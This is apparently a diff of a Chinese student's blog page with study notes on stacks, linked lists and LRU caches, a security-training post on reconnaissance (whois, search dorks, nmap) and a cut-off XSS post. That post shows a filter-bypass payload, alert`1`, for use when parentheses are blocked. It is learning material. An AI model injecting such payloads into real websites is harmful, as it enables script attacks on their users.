+<li>当我们在主函数里调用一个子函数时，压入栈的数据是先压主函数里的变量，再压子函数里的数据。出栈时也是先释放子函数里的变量。符合子函数先调用完先清除数据的规则【这一点我觉得有点类似于函数的<strong>递归调用</strong>】</li>
+</ul>
+<h3 id="栈在表达式求值里的作用"><a href="#栈在表达式求值里的作用" class="headerlink" title="栈在表达式求值里的作用"></a>栈在表达式求值里的作用</h3><h4 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h4><blockquote>
+<p>实际上，编译器就是通过两个栈来实现的。其中<strong>一个保存操作数的栈</strong>，<strong>另一个是保存运算符的栈</strong>。我们从左向右遍历表达式，当遇到数字，我们就直接压入操作数栈；当遇到运算符，就与运算符栈的栈顶元素进行比较。<br>如果比运算符栈顶元素的优先级<strong>高</strong>，就将当前运算符压入栈；如果比运算符栈顶元素的优先级<strong>低或者相同</strong>，从运算符栈中取栈顶运算符，从操作数栈的栈顶取 2 个操作数，然后进行计算，再把计算完的结果压入操作数栈，继续比较。</p>
+</blockquote>
+<p><img src="/2020/05/02/%E6%A0%88/%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97.jpg" alt="四则运算"></p>
+<h4 id="括号合法性检查"><a href="#括号合法性检查" class="headerlink" title="括号合法性检查"></a>括号合法性检查</h4><ol>
+<li>从左至右依次扫描括号</li>
+<li>扫描到<strong>左括号</strong>压入栈中</li>
+<li>扫描到<strong>右括号</strong>，从栈顶取出左括号，相同则合法；不相同则不合法</li>
+</ol>
+<h4 id="浏览器的前进后退"><a href="#浏览器的前进后退" class="headerlink" title="浏览器的前进后退"></a>浏览器的前进后退</h4><ol>
+<li>设置栈X和栈Y</li>
+<li>浏览时，浏览的页面依次压入栈X</li>
+<li>后退时，取X栈顶压入Y</li>
+<li>前进时，取Y栈顶压入X</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/01/mst-day1/">mst_day1</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-01</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;whois.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="大数据平台"><a href="#大数据平台" class="headerlink" title="大数据平台"></a>大数据平台</h2><p><img src="/2020/05/01/mst-day1/%E5%A4%A7%E6%95%B0%E6%8D%AE.png" alt="大数据"></p>
+<h2 id="bing接口查询"><a href="#bing接口查询" class="headerlink" title="bing接口查询"></a>bing接口查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;bing.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>layer子域名挖掘机</p>
+<h1 id="高级搜索引擎"><a href="#高级搜索引擎" class="headerlink" title="高级搜索引擎"></a>高级搜索引擎</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intitle:baidu.com</span><br><span class="line">inurl:baidu.com</span><br><span class="line">intext:baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/01/mst-day1/2.png" alt="2"></p>
+<h1 id="网站服务器信息"><a href="#网站服务器信息" class="headerlink" title="网站服务器信息"></a>网站服务器信息</h1><ul>
+<li>PING</li>
+<li>多地PING</li>
+<li>IP反查</li>
+</ul>
+<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><ul>
+<li>URL编码：%+十六进制</li>
+<li>Base64编码</li>
+<li>HTML实体化编码：&amp;lt</li>
+</ul>
+<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>md5撞密</p>
+<h1 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h1><p><img src="/2020/05/01/mst-day1/1.png" alt="1"></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/30/%E9%93%BE%E8%A1%A8/">链表</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-30</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><h1 id="数组和链表的区别"><a href="#数组和链表的区别" class="headerlink" title="数组和链表的区别"></a>数组和链表的区别</h1><table>
+<thead>
+<tr>
+<th></th>
+<th>数组</th>
+<th>链表</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>内存存储空间</td>
+<td>需要<strong>连续</strong>的内存空间来存储</td>
+<td>通过指针将一组<strong>零散</strong>的内存块串联使用</td>
+</tr>
+<tr>
+<td>插入、删除数据</td>
+<td><strong>缺：</strong>为了保持数据连续性，要做大量数据搬移。时间复杂度为：<strong>O(n)</strong></td>
+<td><strong>优：</strong>只需考虑相邻结点的指针改变。时间复杂度为：<strong>O(1)</strong></td>
+</tr>
+<tr>
+<td>访问</td>
+<td><strong>优：</strong>可以<strong>随机访问</strong>第k个元素。时间复杂度为：<strong>O(1)</strong></td>
+<td><strong>缺：</strong>要<strong>遍历</strong>结点来找到目标结点。时间复杂度为：<strong>O(n)</strong></td>
+</tr>
+<tr>
+<td>CPU缓存机制</td>
+<td><strong>优：</strong>因为数组是连续的内存空间，可以借助CPU缓存机制，预读数组中的数据，<strong>访问数据效率更高</strong>。</td>
+<td><strong>缺：</strong>不可以借助CPU缓存机制</td>
+</tr>
+<tr>
+<td>大小固定</td>
+<td><strong>缺：</strong>大小<strong>固定</strong>，改变大小需要将原来所有数据再复制过去，非常费时。</td>
+<td><strong>优：</strong>支持动态扩容。</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>对于CPU缓存机制【转】</p>
+<p>CPU在从内存读取数据的时候，会先把读取到的数据加载到CPU的缓存中。而CPU每次从内存读取数据并不是只读取那个特定要访问的地址，而是读取一个<strong>数据块</strong>(这个大小我不太确定。。)并保存到CPU缓存中，然后下次访问内存数据的时候就会先从CPU缓存开始查找，如果找到就不需要再从内存中取。这样就实现了比内存访问速度更快的机制，也就是CPU缓存存在的意义:为了弥补内存访问速度过慢与CPU执行速度快之间的差异而引入。</p>
+<p>对于数组来说，存储空间是连续的，所以在加载某个下标的时候可以把以后的几个下标元素也加载到CPU缓存这样执行速度会快于存储空间不连续的链表存储。</p>
+</blockquote>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/7.jpg" alt="7"></p>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/5.jpg" alt="5"></p>
+<h1 id="几种链表"><a href="#几种链表" class="headerlink" title="几种链表"></a>几种链表</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/6.jpg" alt="6"></p>
+<p>头结点用来记录链表的基地址，尾结点指向一个空地址NULL</p>
+<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/4.jpg" alt="4"></p>
+<p>循环链表的尾结点指向链表的头结点</p>
+<h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点：</strong></h3><p>适合处理具有环形结构的数据</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>约瑟夫问题</p>
+<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/3.jpg" alt="3"></p>
+<p>比单链表多了一个prev前驱节点</p>
+<p><strong>优点：</strong>支持双向遍历</p>
+<p><strong>缺点：</strong>占用过多内存空间</p>
+<blockquote>
+<p>双向链表采用了<strong>用空间换时间</strong>的策略</p>
+</blockquote>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="链表中的删除操作"><a href="#链表中的删除操作" class="headerlink" title="链表中的删除操作"></a>链表中的删除操作</h4><h5 id="删除结点中“值等于某个给定值”的结点"><a href="#删除结点中“值等于某个给定值”的结点" class="headerlink" title="删除结点中“值等于某个给定值”的结点"></a>删除结点中“值等于某个给定值”的结点</h5><p>单链表和双向链表都要遍历，时间复杂度均为：O(n)。</p>
+<h5 id="删除给定指针指向的结点"><a href="#删除给定指针指向的结点" class="headerlink" title="删除给定指针指向的结点"></a>删除给定指针指向的结点</h5><p>单链表：找到了要删除的结点，但不支持访问前驱节点，又要从头遍历，直到p-&gt;next=q 。时间复杂度：O(n)。</p>
+<p>双向链表：找到了要删除的结点，直接用前驱节点删除。时间复杂度：O(1)。</p>
+<h4 id="链表中的查询操作【对于有序链表】"><a href="#链表中的查询操作【对于有序链表】" class="headerlink" title="链表中的查询操作【对于有序链表】"></a>链表中的查询操作【对于有序链表】</h4><p>双向链表可以通过数据的大小决定往前还是往后查询，省去一半的时间。</p>
+<h2 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/2.jpg" alt="2"></p>
+<h1 id="链表的实际应用场景"><a href="#链表的实际应用场景" class="headerlink" title="链表的实际应用场景"></a>链表的实际应用场景</h1><p>几种缓存淘汰机制</p>
+<ol>
+<li>先进先出【FIFO：First In，First Out】</li>
+<li>最少使用策略【LFU：Least Frequently Used】</li>
+<li>最近最少使用策略【LRU：Least Recently Used】</li>
+</ol>
+<h2 id="LRU缓存淘汰算法【转】"><a href="#LRU缓存淘汰算法【转】" class="headerlink" title="LRU缓存淘汰算法【转】"></a>LRU缓存淘汰算法【转】</h2><p>如何基于链表实现 LRU 缓存淘汰算法？</p>
+<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的【老数据】。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
+<ol>
+<li>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</li>
+<li>如果此数据没有在缓存链表中，又可以分为两种情况：</li>
+</ol>
+<p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
+<p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
+<p>这样我们就用链表实现了一个 LRU 缓存，是不是很简单？</p>
+<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为 O(n)。</p>
+<p>实际上，我们可以继续优化这个实现思路，比如引入散列表（Hash table）来记录每个数据的位置，将缓存访问的时间复杂度降到 O(1)。因为要涉及我们还没有讲到的数据结构，所以这个优化方案，我现在就不详细说了，等讲到散列表的时候，我会再拿出来讲。</p>
+<h1 id="链表代码的书写技巧"><a href="#链表代码的书写技巧" class="headerlink" title="链表代码的书写技巧"></a>链表代码的书写技巧</h1><h2 id="警惕指针丢失和内存泄漏"><a href="#警惕指针丢失和内存泄漏" class="headerlink" title="警惕指针丢失和内存泄漏"></a>警惕指针丢失和内存泄漏</h2><p>错误样例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next=x;</span><br><span class="line">x-&gt;next=p-&gt;next;<span class="comment">//这句相当于把x的值赋给x</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用哨兵简化实现难度"><a href="#利用哨兵简化实现难度" class="headerlink" title="利用哨兵简化实现难度"></a>利用哨兵简化实现难度</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>如果要在p结点后面插入一个新的结点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_node -&gt; next = p -&gt; next;</span><br><span class="line">p -&gt; next = new_node;</span><br></pre></td></tr></table></figure>
+
+<p>特殊情况：向空链表插入第一个结点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head==null)&#123;</span><br><span class="line">    head = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>单链表的结点删除操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
+
+<p>特殊情况：删除最后一个结点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next==null)&#123;</span><br><span class="line">    head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>可以看出，无论是插入还是删除都需要考虑特殊情况，比较麻烦。</p>
+<p>这是可以考虑引入<strong>哨兵</strong>。</p>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/8.jpg" alt="8"></p>
+<p>我们让head一直指向这个哨兵结点，哨兵结点内不存储任何数据，我们把这种链表称为<strong>带头链表</strong>。</p>
+<p>在这种情况下，我们插入、删除都可以利用上面的一般表达式。</p>
+<h2 id="重点留意边界条件处理"><a href="#重点留意边界条件处理" class="headerlink" title="重点留意边界条件处理"></a>重点留意边界条件处理</h2><ol>
+<li>如果链表为空</li>
+<li>如果链表只包含一个结点</li>
+<li>如果链表只包含两个结点</li>
+<li>代码逻辑在处理头结点和尾结点时</li>
+</ol>
+<h2 id="多写多练"><a href="#多写多练" class="headerlink" title="多写多练"></a>多写多练</h2><ul>
+<li>单链表反转</li>
+<li>链表中环的检测</li>
+<li>两个有序链表的合并</li>
+<li>删除链表倒数第n个结点</li>
+<li>求链表的中间结点</li>
+</ul>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/19/XSS/">XSS</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>
 
 
@@ -199,255 +469,7 @@
 <li>看家里的网有点慢，就重置了哈路由器，这玩意还有点复杂，一堆乱七八糟的密码，不过还是弄好啦（感觉上快了不少）。</li>
 </ol>
 <p>今天起晚了，加上下午看指针进入了状态所以就多看了一点，有些东西没有完成，明天加油（明天吃火锅）。</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/27/2020-02-28%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-28日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-27</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-28日目标"><a href="#2020-02-28日目标" class="headerlink" title="2020-02-28日目标"></a>2020-02-28日目标</h2><table>
-<thead>
-<tr>
-<th>7：00</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7：00-8：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>8：30-10：00</td>
-<td>高数</td>
-</tr>
-<tr>
-<td>10：15-11：00</td>
-<td>JS</td>
-</tr>
-<tr>
-<td>11：15-12：00</td>
-<td>sql书71-99</td>
-</tr>
-<tr>
-<td>14：00-15：30</td>
-<td>c语言</td>
-</tr>
-<tr>
-<td>15：45-16：30</td>
-<td>JS</td>
-</tr>
-<tr>
-<td>16：45-17：30</td>
-<td>物理</td>
-</tr>
-<tr>
-<td>19：30-20：30</td>
-<td>sql书99-109</td>
-</tr>
-<tr>
-<td></td>
-<td>keep</td>
-</tr>
-<tr>
-<td></td>
-<td>刷题</td>
-</tr>
-<tr>
-<td></td>
-<td>整理</td>
-</tr>
-</tbody></table>
-<ul>
-<li>学电脑：6h</li>
-<li>锻炼：30min</li>
-<li>大学内容：3h</li>
-</ul>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/26/2020-02-27%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-27日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-26</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-27日目标"><a href="#2020-02-27日目标" class="headerlink" title="2020-02-27日目标"></a>2020-02-27日目标</h2><p>Everything gonna be Okey。</p>
-<table>
-<thead>
-<tr>
-<th>7：00</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7：00-8：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>8：30-9：30</td>
-<td>预习高数</td>
-</tr>
-<tr>
-<td>9：45-10：45</td>
-<td>JS</td>
-</tr>
-<tr>
-<td>11：00-12：00</td>
-<td>英语网课</td>
-</tr>
-<tr>
-<td>14：00-15：40</td>
-<td>高数网课</td>
-</tr>
-<tr>
-<td>16：00-17：40</td>
-<td>物理网课</td>
-</tr>
-<tr>
-<td>19：30-20：00</td>
-<td>keep</td>
-</tr>
-<tr>
-<td>20：45-22：00</td>
-<td>sql书</td>
-</tr>
-<tr>
-<td>23：30</td>
-<td>上床</td>
-</tr>
-</tbody></table>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/25/2020-02-26%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-26日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-25</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-26日目标"><a href="#2020-02-26日目标" class="headerlink" title="2020-02-26日目标"></a>2020-02-26日目标</h2><table>
-<thead>
-<tr>
-<th>7：00</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7：00-8：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>8：30-10：00</td>
-<td>sql</td>
-</tr>
-<tr>
-<td>10：20-12：00</td>
-<td>c语言网课</td>
-</tr>
-<tr>
-<td>14：00-15：15</td>
-<td>高数作业+数学通识</td>
-</tr>
-<tr>
-<td>15：30-17：00</td>
-<td>JAVASCRIPT网课</td>
-</tr>
-<tr>
-<td>19：00-20：00</td>
-<td>c语言指针</td>
-</tr>
-<tr>
-<td>20：15-21：30</td>
-<td>刷题</td>
-</tr>
-<tr>
-<td>21：40-22：30</td>
-<td>整理一些琐事杂事</td>
-</tr>
-<tr>
-<td>24：00</td>
-<td>上床</td>
-</tr>
-</tbody></table>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/24/2020-02-25%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-25日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-24</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-25日目标"><a href="#2020-02-25日目标" class="headerlink" title="2020-02-25日目标"></a>2020-02-25日目标</h2><table>
-<thead>
-<tr>
-<th>7：00</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7：00-8：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>8：20-10：00</td>
-<td>英语网课</td>
-</tr>
-<tr>
-<td>10：20-12：00</td>
-<td>物理网课</td>
-</tr>
-<tr>
-<td>14：00-15：40</td>
-<td>高数网课</td>
-</tr>
-<tr>
-<td>16：00-17：15</td>
-<td>sql书</td>
-</tr>
-<tr>
-<td>19：00-20：30</td>
-<td>c语言</td>
-</tr>
-<tr>
-<td>20：45-22：00</td>
-<td>结合sql书，完成sqli-labs</td>
-</tr>
-<tr>
-<td>24：00</td>
-<td>上床</td>
-</tr>
-</tbody></table>
-<h2 id="2020-02-24总结"><a href="#2020-02-24总结" class="headerlink" title="2020-02-24总结"></a>2020-02-24总结</h2><ol>
-<li><p>看了c语言的几种变量</p>
-</li>
-<li><p>sql书看了第2章</p>
-</li>
-<li><p>写好了菜单程序</p>
-</li>
-<li><p>做好了mooc</p>
-</li>
-<li><p>看DVWA的js，还是不太精通啊，还得再夯实一下基础知识。</p>
-</li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/23/2020-02-24%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-24日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-23</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-24目标"><a href="#2020-02-24目标" class="headerlink" title="2020-02-24目标"></a>2020-02-24目标</h2><table>
-<thead>
-<tr>
-<th>7：00</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7：00-8：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>8：20-10：00</td>
-<td>c语言网课</td>
-</tr>
-<tr>
-<td>10：30-12：00</td>
-<td>sql书</td>
-</tr>
-<tr>
-<td>14：00-15：40</td>
-<td>近代史网课</td>
-</tr>
-<tr>
-<td>16：00-17：40</td>
-<td>高数网课</td>
-</tr>
-<tr>
-<td>19：00-19：30</td>
-<td>sql书</td>
-</tr>
-<tr>
-<td>19：30-21：10</td>
-<td>音乐鉴赏网课</td>
-</tr>
-<tr>
-<td>21：30-22：30</td>
-<td>DVWA JavaScript</td>
-</tr>
-<tr>
-<td>24：00</td>
-<td>上床</td>
-</tr>
-</tbody></table>
-<h2 id="2020-02-23总结"><a href="#2020-02-23总结" class="headerlink" title="2020-02-23总结"></a>2020-02-23总结</h2><ol>
-<li>完成DVWA  weak sid</li>
-<li>完成DVWA csp bypass（high级别以后再深入理解）</li>
-<li>看了sql第二节</li>
-<li>看了c语言指针第三节</li>
-</ol>
-</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
 }</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
